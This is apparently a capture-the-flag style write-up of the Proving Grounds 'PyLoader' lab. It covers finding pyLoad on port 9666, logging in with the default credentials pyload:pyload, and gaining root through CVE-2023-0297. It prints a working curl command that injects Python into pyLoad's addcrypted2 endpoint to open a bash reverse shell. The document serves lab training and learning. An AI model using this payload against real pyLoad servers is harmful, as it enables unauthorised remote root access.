---
layout: post
title: "PyLoader - Proving Grounds Practice"
summary: "Port 9666 → pyLoad default credentials pyload:pyload → pyLoad 0.5.0 → CVE-2023-0297 (pyLoad RCE) → root"
---

# PyLoader - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed SSH and port 9666 was open.

<img width="794" height="577" alt="00 - nmap" src="https://github.com/user-attachments/assets/01fe2a00-731c-4e09-b8da-5e5fcd607dcc" />

### Web Enumeration
Visiting the website revealed it was pyLoad website.

<img width="1270" height="583" alt="01 - web" src="https://github.com/user-attachments/assets/be657dad-e274-4a30-af18-186862408f24" />

After some research I found pyLoad uses default credentials `pyload:pyload` initially. There was also a `nuclei` template for it.

<img width="1760" height="897" alt="02 - default creds" src="https://github.com/user-attachments/assets/86802a76-3307-49d6-9502-9866e655b070" />

I executed `nuclei` and found that it is indeed using default credentials.

<img width="1555" height="499" alt="02 - default creds with nuclei " src="https://github.com/user-attachments/assets/9d5427db-bf6b-4d1f-b913-06f2f5a351e3" />

And visiting the info page revealed `pyLoad 0.5.0` was running.

<img width="1280" height="761" alt="03 - pyload version" src="https://github.com/user-attachments/assets/1dbacf41-7f80-4336-838c-6fca25b8b61a" />

## Exploit to Root
### CVE-2023-0297
Code Injection in GitHub repository pyload/pyload prior to 0.5.0b3.dev31.

This version was vulnerable to RCE through command injection. After some research I found that all we need to do is execute a curl command like below:
```bash
curl -i -s -k -X POST --data-binary "jk=pyimport%20os;os.system(\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F${LHOST}%2F${LPORT}%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa"  "${WEBHOST}/flash/addcrypted2"
```

But there was a repo ([overgrowncarrot1/CVE-2023-0297](https://github.com/overgrowncarrot1/CVE-2023-0297)), so I executed it.

<img width="1266" height="467" alt="04 - github" src="https://github.com/user-attachments/assets/50a16b84-e6b5-434f-8b69-4b6fe394ea0c" />

<img width="606" height="196" alt="05 - exp" src="https://github.com/user-attachments/assets/9d6740d0-cfcf-4c66-9b51-1e159b2f0b97" />

And executing it got me root shell.

<img width="668" height="572" alt="06 - gg" src="https://github.com/user-attachments/assets/2b5911ba-4ddb-41fa-8cb7-bb638fe61204" />


